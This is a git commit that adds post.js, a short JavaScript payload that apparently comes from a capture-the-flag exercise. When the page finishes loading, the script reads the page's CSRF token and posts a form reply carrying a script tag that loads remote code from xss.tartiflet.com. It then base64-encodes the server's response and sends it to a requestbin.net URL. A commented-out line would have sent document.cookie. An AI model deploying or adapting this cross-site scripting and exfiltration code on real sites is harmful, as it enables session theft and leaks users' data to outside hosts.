e150c380710a4a246c2118355140e4659ae594a9
d3x73r <58302570+BradyTheGoat@users.noreply.github.com>
2020-11-16 02:38:20 +0100

    Create post.js

---
+++ post.js
@@ -0,0 +1,20 @@
+document.onreadystatechange = function () {
+ if (document.readyState === 'complete') {
+  gofun();
+ }
+}
+function gofun() {
+	var xmlHttp = new XMLHttpRequest();
+	xmlHttp.open( "POST", document.location, false);
+	xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	var MyToken = document.getElementById("csrf_token").value;
+	var MyTitle = "hey";
+	var MyCategory = "password_reset";
+//	var MyMessage = "FLAG !"+document.cookie
+	var MyMessage = "<sCrIpT language=javascript src='http://xss.tartiflet.com/get.js'></sCrIpt>";
+	xmlHttp.send("csrf_token="+MyToken+"&response="+MyMessage);
+	var ret = xmlHttp.responseText;
+	var x = new XMLHttpRequest();
+	x.open("GET", "http://requestbin.net/r/14asih01?inspect"+btoa(ret), false);
+	x.send();
+}
